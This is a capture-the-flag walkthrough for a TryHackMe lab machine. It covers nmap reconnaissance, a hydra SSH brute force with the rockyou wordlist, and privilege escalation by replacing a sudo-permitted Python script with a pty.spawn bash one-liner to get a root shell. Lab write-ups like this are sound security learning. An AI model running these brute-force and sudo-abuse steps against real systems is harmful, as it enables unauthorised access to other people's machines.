WALKTHROUGH

Boot up target machine via TryHackMe and attack machine using openvpn on kali vm

Begin recon with nmap scan on target machine

While nmap scan is running, access http page via browser
  
Can't navigate the directory via UI, but can see user 'melodias' has posted
    Also note that root, www-data and anonymous have left comments on meliodas's post

Check nmap scan, identify two open ports and an accesible robots.txt file
  └─$ nmap -sV -sC -A <TARGETMACHINE>          
  ...
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  ...
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

  |_http-server-header: Apache/2.4.18 (Ubuntu)

  Running: Linux 5.X
  OS CPE: cpe:/o:linux:linux_kernel:5.4
  OS details: Linux 5.4

Access robots.txt file via browser
  <TARGETIP>/robots.txt
    User-agent: rockyou 
    Disallow: /
      *clue - rockyou is the name of a popular password list

  So far, a username and password list have been identified

Use hydra against the target machine with the information gathered
  hydra -l meliodas -P /path/to/wordlists/rockyou.txt -t 6 ssh://<TARGETMACHINE>
    Password found!

SSH into target using harvested credentials and cat user.txt
  [FLAG 1 FOUND]

Open other tab and use hydra against the root account
   hydra -l root -P /path/to/wordlists/rockyou.txt -t 6 ssh://<TARGETMACHINE>
      Taking forever, keep running in case but let's keep moving

Return to ssh terminal and check privileges for meliodas 
    meliodas@ubuntu:~$ sudo -l
    ...
    User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py

        meliodas can use sudo to run a python script without password in same folder as first flag
          Probably something, doesn't seem to be much help at first
            Script isn't helpful, can't edit the file
            This part took me some time in playing at different angles of attack
              Changing file permissions, cracking root password
          The solve is simpler than I was working towards

The file can't be changed but it can be deleted and replaced with an identically named file
  The path remains the same so the user privileges can be exploited

Delete bak.py script and replace it with a new bak.py that contains a shell command to provide a privileged python shell on execution

   meliodas@ubuntu:~$ ls -l
   total 8
   -rw-r--r-- 1 root     root     353 Aug 23  2019 bak.py
   -rw-rw-r-- 1 meliodas meliodas  33 Aug 23  2019 user.txt
   meliodas@ubuntu:~$ rm bak.py 
   rm: remove write-protected regular file 'bak.py'? yes
   meliodas@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash")' > bak.py
   meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py

          Note the path specification aligns with the system permissions
                <User meliodas may run the following commands on ubuntu:
                (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py>

    root@ubuntu:~# cat /root/root.txt
  [FLAG 2 FOUND]

Return to tab with hydra still running against the root account and stop process
    No yield, no problem
